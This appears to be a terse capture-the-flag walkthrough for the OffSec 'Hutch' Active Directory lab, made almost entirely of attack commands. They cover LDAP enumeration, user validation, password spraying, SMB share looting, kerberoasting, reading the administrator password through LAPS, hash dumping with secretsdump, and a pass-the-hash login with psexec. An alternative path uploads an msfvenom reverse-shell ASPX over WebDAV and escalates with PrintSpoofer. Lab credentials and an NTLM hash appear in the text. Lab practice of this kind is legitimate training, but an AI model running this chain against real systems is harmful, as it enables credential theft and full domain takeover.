```
ldapsearch -x -h TARGET -b "dc=hutch,dc=offsec" > ldap_search.txt
```

To get all the users ->
```
cat ldap_search.txt | grep -i "samaccountname"\
```

To get the description ->
```
cat ldap_search.txt | grep -i description
```

```
cat raw_users.txt | cut -d: -f2 | tr -d " " > users.txt
```

Confirming that all the users are valid ->
```
kerbrute -domain hutch.offsec -users ./users.txt -dc-ip TARGET
```

```
crackmapexec smb TARGET -u ./users.txt -p ./passwords.txt --continue-on-success
```

```
crackmapexec winrm TARGET -u fmcsorely -p CrabSharkJellyfish192
```

```
crackmapexec smb TARGET -u fmcsorley -p CrabSharkJellyfish192 --shares
```

```
smbclient \\\\TARGET\\SYSVOL -U "hutch.offsec\fmcsorley"
recurse on
prompt off
mget *
```

kerberoast ->
```
GetUserSPNs.py hutch.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip TARGET
```

asrep-roast ->
```
GetNPUsers.py hutch.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip TARGET
```

checking all ADusers ->
```
GetADUsers.py -all -dc-ip TARGET hutch.offsec/fmcsorley:CrabSharkJellyfish192
```
found another user called domainadmin

Getting admins password ->
```
crackmapexec ldap TARGET -u fmcsorley -p CrabSharkJellyfish192 --kdcHost TARGET -M laps
```

dumping all hashes with administrators password ->
```
secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@TARGET
```

getting into the machine as system ->
```
psexec.py domainadmin@TARGET -hashes aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7
```

Alternatively ->
```
cadaver http://TARGET
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=TARGET LPORT=80 --platform Windows -a x64 -f aspx -o shell.aspx
```

```
put shell.aspx
```

```
Printspoofer64.exe -i -c cmd.exe
```
